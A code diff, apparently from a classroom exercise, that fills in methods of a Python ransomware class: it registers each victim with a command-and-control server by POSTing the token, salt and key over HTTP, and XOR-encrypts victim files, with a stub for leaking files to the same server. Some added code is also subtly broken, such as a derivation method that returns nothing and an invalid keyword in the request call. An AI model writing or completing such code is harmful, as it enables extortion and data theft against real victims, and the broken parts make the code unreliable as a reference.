@@ -28,7 +28,13 @@ class SecretManager:
         self._log = logging.getLogger(self.__class__.__name__)
 
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        raise NotImplemented()
+        # Salt derivation
+        salt_derivation = PBKDF2HMAC(algorithm=hashes.SHA256(),
+                        length=self.SALT_LENGTH,
+                        salt=secrets.token_bytes(16),
+                        iterations=self.ITERATION)
+
+        salt = salt_derivation.derive(salt)
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
@@ -41,7 +47,17 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         # register the victim to the CNC
-        raise NotImplemented()
+        URL = f"http://{self._remote_host_port}/new"
+        DATA = {
+            "token" : self.bin_to_b64(token),
+            "salt"  : self.bin_to_b64(salt),
+            "key"   : self.bin_to_b64(key),
+        }
+        self._log.info(f"POST {URL} {DATA}")
+        R = requests.post(URL, DATA=DATA)
+        self._log.info(f"POST {URL} {DATA} {R.status_code}")
+        if R.status_code != 200:
+            raise Exception("Error while registering to the CNC")   
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
@@ -64,8 +80,9 @@ class SecretManager:
         raise NotImplemented()
 
     def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        raise NotImplemented()
+        # xor a list for fi
+        for file in files:
+            self._files_encrypted[str(file)] = xorfile(file, self._key)
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
